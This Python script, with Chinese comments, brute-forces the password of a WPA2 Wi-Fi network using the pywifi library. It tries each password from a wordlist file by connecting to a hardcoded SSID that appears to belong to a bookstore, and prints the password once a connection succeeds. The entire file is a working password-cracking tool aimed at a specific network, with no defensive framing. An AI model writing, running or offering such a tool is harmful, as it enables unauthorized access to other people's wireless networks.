# 本脚本既不是pin码破解，也不是抓包破解，而是直接连接wifi暴力匹配密码本中的密码---贼慢
import pywifi
# attain the const warehouse of access status
from pywifi import const 
import time

# 测试连接,返回连接结果
def wifiConnect(ifaces,pwd):
    # 断开上一次尝试连接时建立的网卡连接
    ifaces.disconnect()
    time.sleep(0.1)
    # 获取wifi的连接状态
    wifistatus = ifaces.status()
    # 网卡断开连接后开始连接测试
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建wifi连接文件
        profile = pywifi.Profile()
        # 要连接的wifi名称--Not Chinese
        profile.ssid = 'SISUBOOKstore'
        # 网卡的开放状态 | auth - AP的认证算法
        profile.auth = const.AUTH_ALG_OPEN
        # wifi的加密算法，一般wifi 加密算法时wps  
        # 选择wifi加密方式  akm - AP的密钥管理类型
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元 /cipher - AP的密码类型
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 调用密码 /wifi密钥 如果无密码，则应该设置此项CIPHER_TYPE_NONE
        profile.key = pwd
        # 删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        # 加载新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        # wifi连接时间
        time.sleep(2.5)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接:!",const.IFACE_DISCONNECTED)
    
# 读取密码本
def readPassword():
    print("开始破解：")
    # 密码本路径,,来自https://github.com/xwayway/wifi-connector
    path ="wifi_password.txt"
    # 打开文件reading in text mode
    f = open(path,"r")
    i = 0
    while True:
        i += 1
        try:
            # 一行一行读取
            password = f.readline()
            password = password[:-1]  # 去除一行末的换行符
            bool = wifiConnect(ifaces,password)
            if bool:
                print("密码已破解：",password)
                print("wifi已连接！")
                ifaces.network_profiles()  # 你连接上wifi的时候可以用这个试试，会返回你连接的wifi的信息
                break
            else:
                print("第",i,"密码破解中，密码校对：",password)
            if not password:
                print('文件已读取完，退出。')
                f.close()
                break
        except:
            # continue
            print("error")

if __name__ == '__main__':
# 抓取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    print(ifaces)
    # 获取电脑无线网卡的名称
    print(ifaces.name())
    readPassword()



